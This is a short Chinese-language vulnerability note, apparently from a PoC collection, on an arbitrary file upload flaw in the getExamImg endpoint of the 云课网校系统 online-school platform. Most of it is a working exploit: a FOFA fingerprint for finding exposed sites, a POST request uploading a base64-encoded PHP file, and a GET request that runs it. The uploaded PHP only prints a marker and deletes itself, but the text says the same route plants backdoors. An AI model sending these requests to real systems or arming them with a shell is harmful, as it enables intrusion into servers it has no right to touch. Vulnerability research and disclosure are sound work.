## 云课网校系统 getExamImg 任意文件上传漏洞

## 漏洞描述
云课网校系统 `getExamImg` 接口未限制上传类型与路径，攻击者可直接上传脚本文件写入后门。

## 网络空间测绘
```
fofa: body="/static/libs/common/jquery.stickyNavbar.min.js"
```

## POC
```
POST /index/Exam/getExamImg HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close

src_data=data:image/php;base64,PD9waHAgcHJpbnQoMTEyMjIyKTt1bmxpbmsoX19GSUxFX18pOz8+
```

```
GET /upload/examanswer/20251028/1761633110.php HTTP/1.1
Host: [请补充实际域名]
Accept: */*
Accept-Encoding: gzip
Connection: keep-alive
```

## 参考
- 社区情报

